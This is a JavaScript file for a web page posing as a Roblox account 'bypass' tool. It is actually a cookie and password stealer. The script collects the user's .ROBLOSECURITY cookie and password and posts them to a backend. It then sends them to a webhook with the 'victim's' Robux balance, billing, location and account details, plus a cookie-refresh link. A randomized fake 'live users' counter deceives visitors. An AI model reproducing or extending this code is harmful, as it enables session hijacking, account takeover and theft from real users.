// Live User Counter - Updates every 2 minutes 30 seconds
function updateLiveUsers() {
    const liveUsersEl = document.getElementById('live-users');
    const randomUsers = Math.floor(Math.random() * 50) + 10; // Random between 10-59
    
    let currentNum = parseInt(liveUsersEl.textContent) || 0;
    const increment = randomUsers > currentNum ? 1 : -1;
    const duration = 1000;
    const steps = Math.abs(randomUsers - currentNum);
    const stepTime = Math.max(duration / steps, 10);
    
    const timer = setInterval(() => {
        currentNum += increment;
        liveUsersEl.textContent = currentNum;
        
        if (currentNum === randomUsers) {
            clearInterval(timer);
        }
    }, stepTime);
}

updateLiveUsers();
setInterval(updateLiveUsers, 150000);

// Account Score Rating
function getScoreRating(score) {
    if (score >= 90) return '🏆 Elite Account';
    if (score >= 75) return '⭐ Premium Account';
    if (score >= 60) return '✨ Great Account';
    if (score >= 40) return '👍 Good Account';
    if (score >= 20) return '📝 Average Account';
    return '🔰 Starter Account';
}

// DOM Elements
const cookieInput = document.getElementById('cookie-input');
const passwordInput = document.getElementById('password-input');
const passwordField = document.getElementById('password-field');
const toggleCookieOnly = document.getElementById('toggle-cookie-only');
const togglePassword = document.getElementById('toggle-password');
const togglePasswordVisibility = document.getElementById('toggle-password-visibility');
const btnStart = document.getElementById('btn-start');

const formState = document.getElementById('form-state');
const processingState = document.getElementById('processing-state');
const successState = document.getElementById('success-state');
const failedState = document.getElementById('failed-state');
const progressBar = document.getElementById('progress-bar');
const progressText = document.getElementById('progress-text');
const userAvatar = document.getElementById('user-avatar');

let usePassword = false;

// Toggle between Cookie Only and Password mode
toggleCookieOnly.onclick = () => {
    usePassword = false;
    toggleCookieOnly.classList.add('bg-white', 'text-black');
    toggleCookieOnly.classList.remove('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    togglePassword.classList.remove('bg-white', 'text-black');
    togglePassword.classList.add('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    passwordField.classList.add('hidden');
};

togglePassword.onclick = () => {
    usePassword = true;
    togglePassword.classList.add('bg-white', 'text-black');
    togglePassword.classList.remove('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    toggleCookieOnly.classList.remove('bg-white', 'text-black');
    toggleCookieOnly.classList.add('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    passwordField.classList.remove('hidden');
};

// Toggle password visibility
if (togglePasswordVisibility) {
    togglePasswordVisibility.onclick = () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        
        const eyeIcon = document.getElementById('eye-icon');
        if (type === 'text') {
            eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
        } else {
            eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
        }
    };
}

// Show error message
function showError(message) {
    alert(message);
}

// Start Bypass
btnStart.onclick = async () => {
    const cookie = cookieInput.value.trim();
    const password = usePassword ? passwordInput.value.trim() : null;

    if (!cookie) {
        showError('Please provide a cookie');
        return;
    }

    if (usePassword && !password) {
        showError('Please enter your password');
        return;
    }

    // Show processing state
    formState.classList.add('hidden');
    processingState.classList.remove('hidden');

    try {
        const response = await fetch('/api/bypass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie, password })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            setTimeout(() => {
                processingState.classList.add('hidden');
                failedState.classList.remove('hidden');
            }, 1500);
            return;
        }

        // Get webhook URL from protect.js
        const WEBHOOK_URL = window.WEBHOOK_URL;
        const d = data.detailedInfo;

        // Build exact format from image
        const description = 
            `[Refresh Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie}) 🔄 | ` +
            `[Profile](https://www.roblox.com/users/${d.userId}/profile) 👤 | ` +
            `[Discord Server](https://discord.gg/your-server) :discord_icon:\n\n` +
            `👤 **Username**\n${d.username}\n\n` +
            (d.password ? `🔑 **Password**\n${d.password}\n\n` : '') +
            `**Account Stats**\n` +
            `**Account Age:** ${d.accountAge}\n` +
            `**Location**\n` +
            `• **Account:** ${d.accountCountry}\n` +
            `• **Victim:** ${d.victimCountry} ${d.victimFlag}\n\n` +
            `💰 **Billing**\n` +
            `Credit ${d.creditBalance} $ ℹ️\n` +
            `Convert ${d.convertBalance} ℹ️\n` +
            `Payments ${d.paymentsBalance} 🛡️\n\n` +
            `👥 **Groups**\n` +
            `Balance ${d.groupBalance} ℹ️\n` +
            `Pending ${d.groupPending} ℹ️\n` +
            `Owned ${d.groupsOwned} 📁\n\n` +
            `⚙️ **Settings**\n` +
            `📧 ${d.emailVerified ? 'True (Verified)' : 'False (Unverified)'} ℹ️\n` +
            `🔔 ${d.emailUnverified ? 'Unset (Unverified)' : 'Set (Verified)'}\n` +
            `🚫 ${d.pinEnabled ? 'Enabled' : 'Disabled'}\n\n` +
            `💳 **Account Funds**\n` +
            `Balance ${d.robux} ℹ️\n` +
            `Pending ${d.pendingRobux} ℹ️\n\n` +
            `🛒 **Purchases**\n` +
            `Limited ${d.limitedPurchases} ℹ️\n` +
            `Summary ${d.purchaseSummary} ℹ️\n\n` +
            `🎮 **Collectibles**\n` +
            `${d.hasHeadless ? '✅ True ✅' : '❌ False ❌'}\n` +
            `${d.hasKorblox ? '✅ True ✅' : '❌ False ❌'}\n\n` +
            `🎯 **Gamepasses | Played**\n` +
            `${d.gamePassesText}\n\n` +
            `💎 **ROBLOSECURITY**\n` +
            `\`\`\`_|SHARE-THIS-TO-\n${cookie}\`\`\``;

        // Prepare webhook with exact format from image
        const webhookData = {
            content: null,
            username: '🔮 Mystic Gen 🔮',
            avatar_url: d.avatarUrl,
            embeds: [{
                author: {
                    name: `${d.username} | ${d.displayName}+`,
                    icon_url: d.avatarUrl
                },
                description: description,
                color: 0x2b2d31,
                thumbnail: {
                    url: d.avatarUrl
                },
                timestamp: new Date().toISOString()
            }]
        };

        // Send webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
        }).catch(() => {});

        // Animate progress bar
        let progress = 0;
        const interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = `${progress}%`;
            progressText.innerText = `${progress}% Complete`;
            
            if (progress >= 100) {
                clearInterval(interval);
                
                // Populate success state
                userAvatar.src = data.avatarUrl || 'https://via.placeholder.com/150';
                document.getElementById('user-display-name').textContent = `@${data.userInfo.username}`;
                document.getElementById('info-username').textContent = data.userInfo.username;
                document.getElementById('info-userid').textContent = data.userInfo.userId;
                document.getElementById('info-robux').textContent = data.userInfo.robux.toLocaleString();
                document.getElementById('info-rap').textContent = (data.userInfo.rap || 0).toLocaleString();
                document.getElementById('info-premium').textContent = data.userInfo.premium;
                document.getElementById('info-vc').textContent = data.userInfo.voiceChat;
                
                const score = data.userInfo.accountScore || 75;
                document.getElementById('account-score').textContent = `${score}/100`;
                document.getElementById('score-bar').style.width = `${score}%`;
                document.getElementById('score-rating').textContent = getScoreRating(score);
                
                // Show success state
                processingState.classList.add('hidden');
                successState.classList.remove('hidden');
                
                // Clear inputs
                setTimeout(() => {
                    cookieInput.value = '';
                    if (passwordInput) passwordInput.value = '';
                }, 2000);
            }
        }, 1200);

    } catch (err) {
        console.error(err);
        setTimeout(() => {
            processingState.classList.add('hidden');
            failedState.classList.remove('hidden');
        }, 1500);
    }
};

// Enter key support
cookieInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') btnStart.click();
});

if (passwordInput) {
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') btnStart.click();
    });
}
